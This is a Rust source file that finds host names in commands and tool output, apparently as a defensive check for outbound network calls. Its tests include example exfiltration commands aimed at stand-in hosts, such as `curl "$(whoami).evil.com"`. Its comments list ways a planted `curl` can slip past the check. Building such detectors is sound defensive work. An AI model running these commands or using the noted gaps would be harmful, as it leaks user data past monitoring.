//! Finds host names in text.
//!
//! Tool output and commands both go through here. Tool output gets stricter
//! rules, because it's full of code like `user.name` and `await.is` that ends
//! like a real domain.

use std::collections::HashSet;
use std::sync::LazyLock;

/// The official list of domain endings, so code like `http.server` isn't taken as a host.
static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
    include_str!("tlds.txt")
        .lines()
        .filter(|l| !l.starts_with('#'))
        .map(str::to_ascii_lowercase)
        .collect()
});

/// In tool output, a plain name counts as a host only if it ends in one of
/// these. With `https://`, `@`, a path or a port, any ending counts.
// ponytail: a planted plain `curl evil.blue` gets through. Add endings when
// real attacks use them, not on a guess.
const COMMON_TLDS: &[&str] = &[
    "biz", "cloud", "cn", "co", "com", "de", "dev", "info", "io", "link", "me", "net", "online",
    "org", "ru", "site", "top", "uk", "xyz",
];

/// Domain endings that are also file types. A name with one of these counts as
/// a host only after `https://` or `user@`, because `lib.rs:12` is a file.
// ponytail: a planted `curl -d @f evil.sh` with no `https://` gets through.
const FILE_TLDS: &[&str] = &[
    "ac", "am", "app", "cc", "cr", "in", "java", "map", "md", "mk", "ml", "mm", "mov", "new", "pl",
    "pm", "pro", "ps", "pub", "py", "rs", "sh", "so", "sv", "tf", "zip", "zone",
];

/// Returns every host name in `text`, lowercased, in order.
/// Pass `output = true` when `text` is tool output.
pub fn hosts(text: &str, output: bool) -> Vec<String> {
    let b = text.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if !is_host_byte(b[i]) {
            i += 1;
            continue;
        }
        let mut s = i;
        while i < b.len() && is_host_byte(b[i]) {
            i += 1;
        }
        let mut e = i;
        while s < e && matches!(b[s], b'.' | b'-') {
            s += 1;
        }
        while e > s && matches!(b[e - 1], b'.' | b'-') {
            e -= 1;
        }
        let (before, run, after) = (&text[..s], text[s..e].to_ascii_lowercase(), &b[e..]);

        // `https://` or `user@` before the name proves it's a host. A path,
        // query or port after it is good evidence. A plain name is the weakest.
        let url = before.ends_with("://") || before.ends_with('@');
        let strong = url
            || matches!(after.first(), Some(b'/' | b'?'))
            || (after.first() == Some(&b':') && after.get(1).is_some_and(u8::is_ascii_digit));
        if !strong && before.ends_with('/') {
            continue; // part of a path, like `src/main.rs`
        }
        if !strong && matches!(after.first(), Some(b'(' | b'_')) {
            continue; // code, like `socket.next()` or `e.to_string`
        }
        if is_ipv4(&run) || is_domain(&run, url, strong, output) {
            out.push(run);
        }
    }
    out
}

fn is_host_byte(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'.' || c == b'-'
}

fn is_domain(s: &str, url: bool, strong: bool, output: bool) -> bool {
    let labels: Vec<&str> = s.split('.').collect();
    let tld = labels[labels.len() - 1];
    labels.len() >= 2
        && labels
            .iter()
            .all(|l| !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-'))
        && TLDS.contains(tld)
        && (url || !FILE_TLDS.contains(&tld))
        && (strong || !output || COMMON_TLDS.contains(&tld))
}

/// Skips `127.x` and `0.x`, since data sent there stays on this machine.
fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4
        && parts
            .iter()
            .all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok())
        && parts[0] != "127"
        && parts[0] != "0"
}

#[cfg(test)]
mod tests {
    use super::hosts;

    #[test]
    fn finds_hosts_and_skips_files_and_code() {
        let cases: &[(&str, &[&str])] = &[
            ("curl https://Evil.com/?d=1", &["evil.com"]),
            ("curl evil.com", &["evil.com"]),
            ("curl \"$(whoami).evil.com\"", &["evil.com"]),
            ("git clone git@github.com:org/repo.git", &["github.com"]),
            (
                "see http://x.sh, a@x.md, x.md/path, lib.rs:12, /a\\/b.md/",
                &["x.sh", "x.md"],
            ),
            ("ping 10.0.0.7; ping 127.0.0.1; ping 0.0.0.0", &["10.0.0.7"]),
            ("cat README.md src/main.rs ~/.ssh/id_rsa.pub", &[]),
            (
                "python -m http.server; v1.2.3; socket.next(); e.to_string",
                &[],
            ),
            ("git config user.name", &["user.name"]),
            ("go to localhost:3000", &[]),
            ("ends with a dot: evil.com.", &["evil.com"]),
        ];
        for (text, want) in cases {
            assert_eq!(hosts(text, false), *want, "input: {text}");
        }
    }

    #[test]
    fn output_side_needs_evidence_for_rare_tlds() {
        let text = "user.name await.is evil.com https://evil.blue x.name/p";
        assert_eq!(hosts(text, true), ["evil.com", "evil.blue", "x.name"]);
    }
}
